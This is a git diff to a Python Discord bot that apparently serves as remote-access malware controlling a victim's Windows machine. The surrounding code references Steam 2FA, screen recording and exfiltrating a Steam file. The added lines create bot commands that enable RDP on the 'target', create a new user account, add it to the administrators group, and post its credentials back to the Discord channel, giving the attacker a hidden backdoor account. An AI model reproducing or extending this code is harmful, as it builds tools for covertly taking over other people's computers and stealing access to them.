@@ -11,6 +11,7 @@ from features.func import *
 from features.setup import *
 from features.steam2fa import *
 from features.screenRecord import *
+from features.windows import *
 
 
 
@@ -108,6 +109,21 @@ def main():
                 await ctx.send(file=discord.File(file))
             else:
                 await ctx.send("Steam file doesn't exist")
+
+    @bot.command()
+    async def rdp_enable(ctx):
+        if enable_rdp_on_target():
+            await ctx.send("Enabled RDP on target")
+
+    @bot.command()
+    async def create_admin_user(ctx):
+        username = create_user_account_on_target()
+        if username:
+            await ctx.send("Created user on target")
+            if add_user_account_to_administrators(username):
+                await ctx.send(f"{username} is now an administrator on target")
+                await ctx.send(f"Creds are - {username}:{username}")
+
     @bot.command()
     async def get_help(ctx):
         await ctx.send("------------------------------- HELP -------------------------------\n\n"
